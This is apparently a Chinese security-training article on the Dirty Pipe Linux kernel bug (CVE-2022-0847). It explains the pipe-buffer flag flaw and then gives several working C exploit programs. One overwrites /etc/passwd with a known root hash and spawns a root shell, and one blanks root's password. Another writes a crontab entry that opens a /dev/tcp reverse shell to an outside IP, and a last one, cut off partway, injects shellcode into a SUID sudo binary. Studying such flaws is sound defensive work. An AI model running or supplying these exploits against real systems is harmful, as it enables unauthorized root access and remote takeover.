#  脏管提权及延伸思考

原创 camer  [ 掌控安全EDU ](javascript:void\(0\);)

**掌控安全EDU** ![]()

微信号 ZKAQEDU

功能介绍 安全教程\高质量文章\面试经验分享，尽在#掌控安全EDU#

____

___发表于_

收录于合集

获网安教程

免费&进群

![](https://gitee.com/fuli009/images/raw/master/public/20230714175308.png)
![](https://gitee.com/fuli009/images/raw/master/public/20230714175309.png)  
本文由掌控安全学院-camer投稿

## 0x01 漏洞概述

Linux 提权漏洞：脏管漏洞（CVE-2022-0847），攻击者可以利用该漏洞实现低权限用户提升至 root
权限，且能对主机任意可读文件进行读写。该漏洞的产生源于新管道缓冲区结构的“flag”变量在 Linux 内核中的
copy_page_to_iter_pipe 和 push_pipe
函数中缺乏正确初始化，从而导致允许覆盖任意只读文件中的数据，使得非特权本地用户利用该漏洞可以提升权限至root。

## 0x02 影响范围

  * Linux Kernel版本 >= 5.8

  * Linux Kernel版本 < 5.16.11 / 5.15.25 / 5.10.102

## 0x03 漏洞原理

管道（pipe）：是一种典型的进程间通信方式。它包含一个输入端和一个输出端，程序将数据从一端输入，从另一端读出；在内核中，为了实现这种数据通信方式，需要以页面（Page）为单位维护一个环形缓冲区（pipe_buffer），其缓冲区最多包含16个页面，且可以被循环利用。

![](https://gitee.com/fuli009/images/raw/master/public/20230714175310.png)

  * CPU管理的最小内存单位是一个页面（page），一个页面通常为4kb（4096字节）大小。如果程序从文件中读取数据，内核将先把它从磁盘读取到专属于内核的页面缓存（PageCache）中，后续再把它从内核区域复制到用户程序的内存空间。

![](https://gitee.com/fuli009/images/raw/master/public/20230714175311.png)

  * splice()系统调用：目标文件页面缓存数据不会直接复制到pipe的缓冲区内，而是以索引的方式（即内存页框地址、偏移量、长度所表示的一块内存区域）复制到pipe_buffer的结构体中，避免了从内核空间向用户空间的数据拷贝过程，这样目标文件页面缓存数据不会直接复制到pipe的缓冲区内，加快将文件内容推送到管道的过程，这个过程称为零拷贝。换句话说，splice()允许普通用户将管道指向已经加载到内存中的页面，其中包含最初由请求只读访问的进程打开的文件的一部分，通过将页面拼接到管道中，再将任意数据写入管道，这样一来就可以覆写页面的内容。

  * 文件覆写入管道后，实际磁盘上不会发生任何更改，只是对页面缓冲区（在内存中）进行了更改，内容并没有被永久更改。Linux Kernel v5.8—`IPE_BUF_FLAG_CAN_MERGE`。当一个程序使用管道写入数据时，pipwrite()调用会处理数据写入工作，默认情况下，多次写入操作是要写入环形缓冲区的一个新页面，但是如果单次写入操作没满一个页面大小，就会造成内存空间的浪费，所以pipbuffer中的每一个页面都包含一个can_merge属性，该属性可以在下一次pipe_write()操作执行时，指示内核继续向同一个页面继续写入数据，而不是获取一个新的页面进行写入。简单来说，这个标志允许用户告诉内核在数据写入时将页面写回磁盘。这个错误允许我们为管道指定任意标志，系统调用无意中允许我们将管道指向以只读方式打开的页面缓冲区。

漏洞本质：splice()系统调用将包含文件的页面缓存（Pagechace），连接到pipe到环形缓冲区（pip_buffer）时，在
copy_page_to_iter_pipe 和 push_pipe
函数中未能正确清除页面“PIPE_BUF_CAN_MERGE”属性（内核写入管道指向的页面的更改应该直接写回页面来源的文件。），导致后续进行pipe_write()操作时错误判定“write操作可合并”，从而将非法数据写入页面缓存，导致文件覆盖漏洞。

漏洞限制：

  1. 被覆盖文件必须具有可读权限

  2. pipe_buffer缓冲区中覆写页面缓存数据，splice()函数需要读取至少一字节的数据进入管道，所以页面第一个字节时不可修改的，单次写入数据不能大于4kb

  3. 任意文件覆盖写入时，不能调整文件的大小

## 0x04 漏洞复现

    
          1. #define _GNU_SOURCE
    
      2. #include <unistd.h>
    
      3. #include <fcntl.h>
    
      4. #include <stdio.h>
    
      5. #include <stdlib.h>
    
      6. #include <string.h>
    
      7. #include <sys/stat.h>
    
      8. #include <sys/user.h>
    
      9.   10. #ifndef PAGE_SIZE
    
      11. #define PAGE_SIZE 4096
    
      12. #endif
    
      13.   14. /**
    
      15.  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
    
      16.  * PIPE_BUF_FLAG_CAN_MERGE flag set.
    
      17.  */
    
      18. static void prepare_pipe(int p[2])
    
      19. {
    
      20.     if (pipe(p)) abort();
    
      21.      // 获取Pipe可使用的最大页面数量
    
      22.     const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    
      23.     static char buffer[4096];
    
      24.      // 任意数据填充
    
      25.     /* fill the pipe completely; each pipe_buffer will now have
    
      26.        the PIPE_BUF_FLAG_CAN_MERGE flag */
    
      27.     for (unsigned r = pipe_size; r > 0;) {
    
      28.         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      29.         write(p[1], buffer, n);
    
      30.         r -= n;
    
      31.     }
    
      32.      //清空Pipe
    
      33.     /* drain the pipe, freeing all pipe_buffer instances (but
    
      34.        leaving the flags initialized) */
    
      35.     for (unsigned r = pipe_size; r > 0;) {
    
      36.         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      37.         read(p[0], buffer, n);
    
      38.         r -= n;
    
      39.     }
    
      40.   41.     /* the pipe is now empty, and if somebody adds a new
    
      42.        pipe_buffer without initializing its "flags", the buffer
    
      43.        will be mergeable */
    
      44. }
    
      45.   46. int main(int argc, char **argv) {
    
      47.     const char *const path = "/etc/passwd";
    
      48.   49.         printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");  
    
      50.         FILE *f1 = fopen("/etc/passwd", "r");
    
      51.         FILE *f2 = fopen("/tmp/passwd.bak", "w");
    
      52.   53.         if (f1 == NULL) {
    
      54.             printf("Failed to open /etc/passwd\n");
    
      55.             exit(EXIT_FAILURE);
    
      56.         } else if (f2 == NULL) {
    
      57.             printf("Failed to open /tmp/passwd.bak\n");
    
      58.             fclose(f1);
    
      59.             exit(EXIT_FAILURE);
    
      60.         }
    
      61.   62.         char c;
    
      63.         while ((c = fgetc(f1)) != EOF)
    
      64.             fputc(c, f2);
    
      65.   66.         fclose(f1);
    
      67.         fclose(f2);
    
      68.   69.     loff_t offset = 4; // after the "root"
    
      70.     const char *const data = ":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt aaron aaron
    
      71.         printf("Setting root password to \"aaron\"...");
    
      72.     const size_t data_size = strlen(data);
    
      73.   74.     if (offset % PAGE_SIZE == 0) {
    
      75.         fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
    
      76.         return EXIT_FAILURE;
    
      77.     }
    
      78.   79.     const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    
      80.     const loff_t end_offset = offset + (loff_t)data_size;
    
      81.     if (end_offset > next_page) {
    
      82.         fprintf(stderr, "Sorry, cannot write across a page boundary\n");
    
      83.         return EXIT_FAILURE;
    
      84.     }
    
      85.      //打开只读文件
    
      86.     /* open the input file and validate the specified offset */
    
      87.     const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    
      88.     if (fd < 0) {
    
      89.         perror("open failed");
    
      90.         return EXIT_FAILURE;
    
      91.     }
    
      92.   93.     struct stat st;
    
      94.     if (fstat(fd, &st)) {
    
      95.         perror("stat failed");
    
      96.         return EXIT_FAILURE;
    
      97.     }
    
      98.   99.     if (offset > st.st_size) {
    
      100.         fprintf(stderr, "Offset is not inside the file\n");
    
      101.         return EXIT_FAILURE;
    
      102.     }
    
      103.   104.     if (end_offset > st.st_size) {
    
      105.         fprintf(stderr, "Sorry, cannot enlarge the file\n");
    
      106.         return EXIT_FAILURE;
    
      107.     }
    
      108.      // 创建Pipe
    
      109.     /* create the pipe with all flags initialized with
    
      110.        PIPE_BUF_FLAG_CAN_MERGE */
    
      111.     int p[2];
    
      112.     prepare_pipe(p);
    
      113.      // splice()将文件1字节数据写入Pipe
    
      114.     /* splice one byte from before the specified offset into the
    
      115.        pipe; this will add a reference to the page cache, but
    
      116.        since copy_page_to_iter_pipe() does not initialize the
    
      117.        "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    
      118.     --offset;
    
      119.     ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    
      120.     if (nbytes < 0) {
    
      121.         perror("splice failed");
    
      122.         return EXIT_FAILURE;
    
      123.     }
    
      124.     if (nbytes == 0) {
    
      125.         fprintf(stderr, "short splice\n");
    
      126.         return EXIT_FAILURE;
    
      127.     }
    
      128.      // write()写入任意数据到Pipe
    
      129.     /* the following write will not create a new pipe_buffer, but
    
      130.        will instead write into the page cache, because of the
    
      131.        PIPE_BUF_FLAG_CAN_MERGE flag */
    
      132.     nbytes = write(p[1], data, data_size);
    
      133.   // 判断是否写入成功
    
      134.     if (nbytes < 0) {
    
      135.         perror("write failed");
    
      136.         return EXIT_FAILURE;
    
      137.     }
    
      138.     if ((size_t)nbytes < data_size) {
    
      139.         fprintf(stderr, "short write\n");
    
      140.         return EXIT_FAILURE;
    
      141.     }
    
      142.   143.     printf("It worked!\n");
    
      144.   145.         system("/bin/sh -c '(echo aaron; cat) | su - -c \""
    
      146.                 "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
    
      147.                 "cp /tmp/passwd.bak /etc/passwd;"
    
      148.                 "echo \\\"Done! Popping shell...\\\";"
    
      149.                 "sleep 2;"
    
      150.                 "echo \\\"(run commands now)\\\";"
    
      151.                 "/bin/sh;" // one shold work
    
      152.             "\" root'");
    
      153.     return EXIT_SUCCESS;
    
      154. }
    
    
    

  1. 创建一个管道（pipe）

  2. 通过（pipe_write）填充管道至满，这样所有的buf(pipe 缓存页)都初始化过了，flag 默认初始化为PIPE_BUF_FLAG_CAN_MERGE

  3. 将管道清空(pipe_read)，这样通过splice()系统调用传送文件的时候就会使用原有的初始化过的buf结构

  4. 使用Splice()读取目标文件（只读）的一字节数据发送至pipe

  5. write()将任意数据继续写入pipe，此数据会覆盖目标文件内容

![](https://gitee.com/fuli009/images/raw/master/public/20230714175312.png)

利用总结与拓展：

  * 通过漏洞覆写`/etc/passwd`密码文件，然后使用该`openssl`命令为您选择的密码创建一个 SHA512Crypt 哈希，修改 root 帐号密码，然后通过管道将自定义密码灌入`su -`命令达到切换到 root 帐号的目的，从而实现提权。

    
          1. #define _GNU_SOURCE
    
      2. #include <unistd.h>
    
      3. #include <fcntl.h>
    
      4. #include <stdio.h>
    
      5. #include <stdlib.h>
    
      6. #include <string.h>
    
      7. #include <sys/stat.h>
    
      8. #include <sys/user.h>
    
      9.   10. #ifndef PAGE_SIZE
    
      11. #define PAGE_SIZE 4096
    
      12. #endif
    
      13.   14. /**
    
      15.  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
    
      16.  * PIPE_BUF_FLAG_CAN_MERGE flag set.
    
      17.  */
    
      18. static void prepare_pipe(int p[2])
    
      19. {
    
      20.     if (pipe(p)) abort();
    
      21.   22.     const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    
      23.     static char buffer[4096];
    
      24.   25.     /* fill the pipe completely; each pipe_buffer will now have
    
      26.        the PIPE_BUF_FLAG_CAN_MERGE flag */
    
      27.     for (unsigned r = pipe_size; r > 0;) {
    
      28.         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      29.         write(p[1], buffer, n);
    
      30.         r -= n;
    
      31.     }
    
      32.   33.     /* drain the pipe, freeing all pipe_buffer instances (but
    
      34.        leaving the flags initialized) */
    
      35.     for (unsigned r = pipe_size; r > 0;) {
    
      36.         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      37.         read(p[0], buffer, n);
    
      38.         r -= n;
    
      39.     }
    
      40.   41.     /* the pipe is now empty, and if somebody adds a new
    
      42.        pipe_buffer without initializing its "flags", the buffer
    
      43.        will be mergeable */
    
      44. }
    
      45.   46. int main() {
    
      47.     const char *const path = "/etc/passwd";
    
      48.   49.         printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
    
      50.         FILE *f1 = fopen("/etc/passwd", "r");
    
      51.         FILE *f2 = fopen("/tmp/passwd.bak", "w");
    
      52.   53.         if (f1 == NULL) {
    
      54.             printf("Failed to open /etc/passwd\n");
    
      55.             exit(EXIT_FAILURE);
    
      56.         } else if (f2 == NULL) {
    
      57.             printf("Failed to open /tmp/passwd.bak\n");
    
      58.             fclose(f1);
    
      59.             exit(EXIT_FAILURE);
    
      60.         }
    
      61.   62.         char c;
    
      63.         while ((c = fgetc(f1)) != EOF)
    
      64.             fputc(c, f2);
    
      65.   66.         fclose(f1);
    
      67.         fclose(f2);
    
      68.   69.     loff_t offset = 4; // after the "root"
    
      70.     const char *const data = ":$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt aaron aaron
    
      71.         printf("Setting root password to \"aaron\"...\n");
    
      72.     const size_t data_size = strlen(data);
    
      73.   74.     if (offset % PAGE_SIZE == 0) {
    
      75.         fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
    
      76.         return EXIT_FAILURE;
    
      77.     }
    
      78.   79.     const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    
      80.     const loff_t end_offset = offset + (loff_t)data_size;
    
      81.     if (end_offset > next_page) {
    
      82.         fprintf(stderr, "Sorry, cannot write across a page boundary\n");
    
      83.         return EXIT_FAILURE;
    
      84.     }
    
      85.   86.     /* open the input file and validate the specified offset */
    
      87.     const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    
      88.     if (fd < 0) {
    
      89.         perror("open failed");
    
      90.         return EXIT_FAILURE;
    
      91.     }
    
      92.   93.     struct stat st;
    
      94.     if (fstat(fd, &st)) {
    
      95.         perror("stat failed");
    
      96.         return EXIT_FAILURE;
    
      97.     }
    
      98.   99.     if (offset > st.st_size) {
    
      100.         fprintf(stderr, "Offset is not inside the file\n");
    
      101.         return EXIT_FAILURE;
    
      102.     }
    
      103.   104.     if (end_offset > st.st_size) {
    
      105.         fprintf(stderr, "Sorry, cannot enlarge the file\n");
    
      106.         return EXIT_FAILURE;
    
      107.     }
    
      108.   109.     /* create the pipe with all flags initialized with
    
      110.        PIPE_BUF_FLAG_CAN_MERGE */
    
      111.     int p[2];
    
      112.     prepare_pipe(p);
    
      113.   114.     /* splice one byte from before the specified offset into the
    
      115.        pipe; this will add a reference to the page cache, but
    
      116.        since copy_page_to_iter_pipe() does not initialize the
    
      117.        "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    
      118.     --offset;
    
      119.     ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    
      120.     if (nbytes < 0) {
    
      121.         perror("splice failed");
    
      122.         return EXIT_FAILURE;
    
      123.     }
    
      124.     if (nbytes == 0) {
    
      125.         fprintf(stderr, "short splice\n");
    
      126.         return EXIT_FAILURE;
    
      127.     }
    
      128.   129.     /* the following write will not create a new pipe_buffer, but
    
      130.        will instead write into the page cache, because of the
    
      131.        PIPE_BUF_FLAG_CAN_MERGE flag */
    
      132.     nbytes = write(p[1], data, data_size);
    
      133.     if (nbytes < 0) {
    
      134.         perror("write failed");
    
      135.         return EXIT_FAILURE;
    
      136.     }
    
      137.     if ((size_t)nbytes < data_size) {
    
      138.         fprintf(stderr, "short write\n");
    
      139.         return EXIT_FAILURE;
    
      140.     }
    
      141.     return EXIT_SUCCESS;
    
      142. }
    
    
    

![](https://gitee.com/fuli009/images/raw/master/public/20230714175314.png)

  * 通过漏洞覆写`/etc/passwd`密码文件，将 root 帐号密码位`x`置空，即`root:x:0:0:root:/root:/bin/bash`改为`root::0:0:root:/root:/bin/bash`，然后用`su root`实现无密码切换到 root 帐号，从而实现提权。

    
          1. #define _GNU_SOURCE
    
      2. #include <unistd.h>
    
      3. #include <fcntl.h>
    
      4. #include <stdio.h>
    
      5. #include <stdlib.h>
    
      6. #include <string.h>
    
      7. #include <sys/stat.h>
    
      8. #include <sys/user.h>
    
      9.   10. #ifndef PAGE_SIZE
    
      11. #define PAGE_SIZE 4096
    
      12. #endif
    
      13.   14. /**
    
      15.  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
    
      16.  * PIPE_BUF_FLAG_CAN_MERGE flag set.
    
      17.  */
    
      18. static void prepare_pipe(int p[2])
    
      19. {
    
      20.     if (pipe(p)) abort();
    
      21.   22.     const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    
      23.     static char buffer[4096];
    
      24.   25.     /* fill the pipe completely; each pipe_buffer will now have
    
      26.        the PIPE_BUF_FLAG_CAN_MERGE flag */
    
      27.     for (unsigned r = pipe_size; r > 0;) {
    
      28.         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      29.         write(p[1], buffer, n);
    
      30.         r -= n;
    
      31.     }
    
      32.   33.     /* drain the pipe, freeing all pipe_buffer instances (but
    
      34.        leaving the flags initialized) */
    
      35.     for (unsigned r = pipe_size; r > 0;) {
    
      36.         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      37.         read(p[0], buffer, n);
    
      38.         r -= n;
    
      39.     }
    
      40.   41.     /* the pipe is now empty, and if somebody adds a new
    
      42.        pipe_buffer without initializing its "flags", the buffer
    
      43.        will be mergeable */
    
      44. }
    
      45.   46. int main() {
    
      47.     const char *const path = "/etc/passwd";
    
      48.   49.         printf("Backing up /etc/passwd to /tmp/passwd.bak ...\n");
    
      50.         FILE *f1 = fopen("/etc/passwd", "r");
    
      51.         FILE *f2 = fopen("/tmp/passwd.bak", "w");
    
      52.   53.         if (f1 == NULL) {
    
      54.             printf("Failed to open /etc/passwd\n");
    
      55.             exit(EXIT_FAILURE);
    
      56.         } else if (f2 == NULL) {
    
      57.             printf("Failed to open /tmp/passwd.bak\n");
    
      58.             fclose(f1);
    
      59.             exit(EXIT_FAILURE);
    
      60.         }
    
      61.   62.         char c;
    
      63.         while ((c = fgetc(f1)) != EOF)
    
      64.             fputc(c, f2);
    
      65.   66.         fclose(f1);
    
      67.         fclose(f2);
    
      68.   69.     loff_t offset = 4; // after the "root"
    
      70.     const char *const data = "::0:0:root:/root:/bin/bash\n";    // clean password
    
      71.         printf("Clean password Success!\n");
    
      72.     const size_t data_size = strlen(data);
    
      73.   74.     if (offset % PAGE_SIZE == 0) {
    
      75.         fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
    
      76.         return EXIT_FAILURE;
    
      77.     }
    
      78.   79.     const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    
      80.     const loff_t end_offset = offset + (loff_t)data_size;
    
      81.     if (end_offset > next_page) {
    
      82.         fprintf(stderr, "Sorry, cannot write across a page boundary\n");
    
      83.         return EXIT_FAILURE;
    
      84.     }
    
      85.   86.     /* open the input file and validate the specified offset */
    
      87.     const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    
      88.     if (fd < 0) {
    
      89.         perror("open failed");
    
      90.         return EXIT_FAILURE;
    
      91.     }
    
      92.   93.     struct stat st;
    
      94.     if (fstat(fd, &st)) {
    
      95.         perror("stat failed");
    
      96.         return EXIT_FAILURE;
    
      97.     }
    
      98.   99.     if (offset > st.st_size) {
    
      100.         fprintf(stderr, "Offset is not inside the file\n");
    
      101.         return EXIT_FAILURE;
    
      102.     }
    
      103.   104.     if (end_offset > st.st_size) {
    
      105.         fprintf(stderr, "Sorry, cannot enlarge the file\n");
    
      106.         return EXIT_FAILURE;
    
      107.     }
    
      108.   109.     /* create the pipe with all flags initialized with
    
      110.        PIPE_BUF_FLAG_CAN_MERGE */
    
      111.     int p[2];
    
      112.     prepare_pipe(p);
    
      113.   114.     /* splice one byte from before the specified offset into the
    
      115.        pipe; this will add a reference to the page cache, but
    
      116.        since copy_page_to_iter_pipe() does not initialize the
    
      117.        "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    
      118.     --offset;
    
      119.     ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    
      120.     if (nbytes < 0) {
    
      121.         perror("splice failed");
    
      122.         return EXIT_FAILURE;
    
      123.     }
    
      124.     if (nbytes == 0) {
    
      125.         fprintf(stderr, "short splice\n");
    
      126.         return EXIT_FAILURE;
    
      127.     }
    
      128.   129.     /* the following write will not create a new pipe_buffer, but
    
      130.        will instead write into the page cache, because of the
    
      131.        PIPE_BUF_FLAG_CAN_MERGE flag */
    
      132.     nbytes = write(p[1], data, data_size);
    
      133.     if (nbytes < 0) {
    
      134.         perror("write failed");
    
      135.         return EXIT_FAILURE;
    
      136.     }
    
      137.     if ((size_t)nbytes < data_size) {
    
      138.         fprintf(stderr, "short write\n");
    
      139.         return EXIT_FAILURE;
    
      140.     }
    
      141.     return EXIT_SUCCESS;
    
      142. }
    
    
    

![](https://gitee.com/fuli009/images/raw/master/public/20230714175315.png)

  * 通过漏洞写`crontab`计划任务文件，定时反弹一个shell，然后通过nc远程接收shell，从而实现提权。

    
          1. #define _GNU_SOURCE
    
      2. #include <unistd.h>
    
      3. #include <fcntl.h>
    
      4. #include <stdio.h>
    
      5. #include <stdlib.h>
    
      6. #include <string.h>
    
      7. #include <sys/stat.h>
    
      8. #include <sys/user.h>
    
      9.   10. #ifndef PAGE_SIZE
    
      11. #define PAGE_SIZE 4096
    
      12. #endif
    
      13.   14. /**
    
      15.  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
    
      16.  * PIPE_BUF_FLAG_CAN_MERGE flag set.
    
      17.  */
    
      18. static void prepare_pipe(int p[2])
    
      19. {
    
      20.         if (pipe(p)) abort();
    
      21.   22.         const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    
      23.         static char buffer[4096];
    
      24.   25.         /* fill the pipe completely; each pipe_buffer will now have
    
      26.            the PIPE_BUF_FLAG_CAN_MERGE flag */
    
      27.         for (unsigned r = pipe_size; r > 0;) {
    
      28.                 unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      29.                 write(p[1], buffer, n);
    
      30.                 r -= n;
    
      31.         }
    
      32.   33.         /* drain the pipe, freeing all pipe_buffer instances (but
    
      34.            leaving the flags initialized) */
    
      35.         for (unsigned r = pipe_size; r > 0;) {
    
      36.                 unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      37.                 read(p[0], buffer, n);
    
      38.                 r -= n;
    
      39.         }
    
      40.   41.         /* the pipe is now empty, and if somebody adds a new
    
      42.            pipe_buffer without initializing its "flags", the buffer
    
      43.            will be mergeable */
    
      44. }
    
      45.   46. int main() {
    
      47.         const char *const path = "/etc/crontab";
    
      48.   49.         printf("Backing up /etc/crontab to /tmp/crontab.bak ...\n");
    
      50.         FILE *f1 = fopen("/etc/crontab", "r");
    
      51.         FILE *f2 = fopen("/tmp/crontab.bak", "w");
    
      52.   53.         if (f1 == NULL) {
    
      54.             printf("Failed to open /etc/crontab\n");
    
      55.             exit(EXIT_FAILURE);
    
      56.         } else if (f2 == NULL) {
    
      57.             printf("Failed to open /tmp/crontab.bak\n");
    
      58.             fclose(f1);
    
      59.             exit(EXIT_FAILURE);
    
      60.         }
    
      61.   62.         char c;
    
      63.         while ((c = fgetc(f1)) != EOF)
    
      64.             fputc(c, f2);
    
      65.   66.         fclose(f1);
    
      67.         fclose(f2);
    
      68.   69.         loff_t offset = 4; // after the "root"
    
      70.         const char *const data = "\n* * * * * root /bin/bash -c 'exec bash -i &> /dev/tcp/192.168.1.6/8023 <&1'\n#";     // Reverse shell
    
      71.         printf("Reverse shell success!\n");
    
      72.         const size_t data_size = strlen(data);
    
      73.   74.         if (offset % PAGE_SIZE == 0) {
    
      75.                 fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
    
      76.                 return EXIT_FAILURE;
    
      77.         }
    
      78.   79.         const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    
      80.         const loff_t end_offset = offset + (loff_t)data_size;
    
      81.         if (end_offset > next_page) {
    
      82.                 fprintf(stderr, "Sorry, cannot write across a page boundary\n");
    
      83.                 return EXIT_FAILURE;
    
      84.         }
    
      85.   86.         /* open the input file and validate the specified offset */
    
      87.         const int fd = open(path, O_RDONLY); // yes, read-only! :-)
    
      88.         if (fd < 0) {
    
      89.                 perror("open failed");
    
      90.                 return EXIT_FAILURE;
    
      91.         }
    
      92.   93.         struct stat st;
    
      94.         if (fstat(fd, &st)) {
    
      95.                 perror("stat failed");
    
      96.                 return EXIT_FAILURE;
    
      97.         }
    
      98.   99.         if (offset > st.st_size) {
    
      100.                 fprintf(stderr, "Offset is not inside the file\n");
    
      101.                 return EXIT_FAILURE;
    
      102.         }
    
      103.   104.         if (end_offset > st.st_size) {
    
      105.                 fprintf(stderr, "Sorry, cannot enlarge the file\n");
    
      106.                 return EXIT_FAILURE;
    
      107.         }
    
      108.   109.         /* create the pipe with all flags initialized with
    
      110.            PIPE_BUF_FLAG_CAN_MERGE */
    
      111.         int p[2];
    
      112.         prepare_pipe(p);
    
      113.   114.         /* splice one byte from before the specified offset into the
    
      115.            pipe; this will add a reference to the page cache, but
    
      116.            since copy_page_to_iter_pipe() does not initialize the
    
      117.            "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    
      118.         --offset;
    
      119.         ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    
      120.         if (nbytes < 0) {
    
      121.                 perror("splice failed");
    
      122.                 return EXIT_FAILURE;
    
      123.         }
    
      124.         if (nbytes == 0) {
    
      125.                 fprintf(stderr, "short splice\n");
    
      126.                 return EXIT_FAILURE;
    
      127.         }
    
      128.   129.         /* the following write will not create a new pipe_buffer, but
    
      130.            will instead write into the page cache, because of the
    
      131.            PIPE_BUF_FLAG_CAN_MERGE flag */
    
      132.         nbytes = write(p[1], data, data_size);
    
      133.         if (nbytes < 0) {
    
      134.                 perror("write failed");
    
      135.                 return EXIT_FAILURE;
    
      136.         }
    
      137.         if ((size_t)nbytes < data_size) {
    
      138.                 fprintf(stderr, "short write\n");
    
      139.                 return EXIT_FAILURE;
    
      140.         }
    
      141.         return EXIT_SUCCESS;
    
      142. }
    
    
    

![](https://gitee.com/fuli009/images/raw/master/public/20230714175316.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230714175317.png)

  * 通过劫持拥有 root 权限的 SUID 进程，进行提权。

    * SUID:允许用户执行的文件以该文件的拥有者身份执行。

    
          1. find / -perm -4000 2>/dev/null   //搜索具有suid权限的文件
    
    
    

![](https://gitee.com/fuli009/images/raw/master/public/20230714175318.png)

![](https://gitee.com/fuli009/images/raw/master/public/20230714175319.png)

    
          1. #define _GNU_SOURCE
    
      2. #include <unistd.h>
    
      3. #include <fcntl.h>
    
      4. #include <stdio.h>
    
      5. #include <stdlib.h>
    
      6. #include <string.h>
    
      7. #include <sys/stat.h>
    
      8. #include <sys/user.h>
    
      9.   10. #ifndef PAGE_SIZE
    
      11. #define PAGE_SIZE 4096
    
      12. #endif 
    
      13.   14. /**
    
      15.  * Create a pipe where all "bufs" on the pipe_inode_info ring have the
    
      16.  * PIPE_BUF_FLAG_CAN_MERGE flag set.
    
      17.  */
    
      18. static void prepare_pipe(int p[2])
    
      19. {
    
      20.     if (pipe(p)) abort();
    
      21.   22.     const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    
      23.     static char buffer[4096];
    
      24.   25.     /* fill the pipe completely; each pipe_buffer will now have
    
      26.        the PIPE_BUF_FLAG_CAN_MERGE flag */
    
      27.     for (unsigned r = pipe_size; r > 0;) {
    
      28.         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      29.         write(p[1], buffer, n);
    
      30.         r -= n;
    
      31.     }
    
      32.   33.     /* drain the pipe, freeing all pipe_buffer instances (but
    
      34.        leaving the flags initialized) */
    
      35.     for (unsigned r = pipe_size; r > 0;) {
    
      36.         unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    
      37.         read(p[0], buffer, n);
    
      38.         r -= n;
    
      39.     }
    
      40.   41.     /* the pipe is now empty, and if somebody adds a new
    
      42.        pipe_buffer without initializing its "flags", the buffer
    
      43.        will be mergeable */
    
      44. }
    
      45.   46. int main() {
    
      47.     const char *const path = "./sudo";
    
      48.   49.         printf("Backing up ./sudo to /tmp/sudo.bak ...\n");
    
      50.         FILE *f1 = fopen("./sudo", "r");
    
      51.         FILE *f2 = fopen("/tmp/sudo.bak", "w");
    
      52.   53.         if (f1 == NULL) {
    
      54.             printf("Failed to open ./sudo\n");
    
      55.             exit(EXIT_FAILURE);
    
      56.         } else if (f2 == NULL) {
    
      57.             printf("Failed to open /tmp/sudo.bak\n");
    
      58.             fclose(f1);
    
      59.             exit(EXIT_FAILURE);
    
      60.         }
    
      61.   62.         char c;
    
      63.         while ((c = fgetc(f1)) != EOF)
    
      64.             fputc(c, f2);
    
      65.   66.         fclose(f1);
    
      67.         fclose(f2);
    
      68.   69.     loff_t offset = 37616;
    
      70.   71.     const char data [255]={0x48,0x31,0xff,0xb0,0x69,0x0f,0x05,0x48,0x31,0xd2,0x48,0xbb,0xff,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x48,0xc1,0xeb,0x08,0x53,0x48,0x89,0xe7,0x48,0x31,0xc0,0x50,0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05,0x6a,0x01,0x5f,0x6a,0x3c,0x58,0x0f,0x05};
    
      72.   73.     printf("Hijacking success!\n");
    
      74.     const size_t data_size = strlen(data);
    
      75.   76.     if (offset % PAGE_SIZE == 0) {
    
      77.         fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
    
      78.         return EXIT_FAILURE;
    
      79.     }
    
      80.   81.     const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
    
      82.     const loff_t end_offset = offset + (loff_t)data_size;
    
      83.     if (end_offset > next_page) {
    
      84.         fprintf(stderr, "Sorry, cannot write across a page boundary\n");
    
      85.         return EXIT_FAILURE;
    
      86.     }
    
      87.   88.     /* open the input file and validate the specified offset */
    
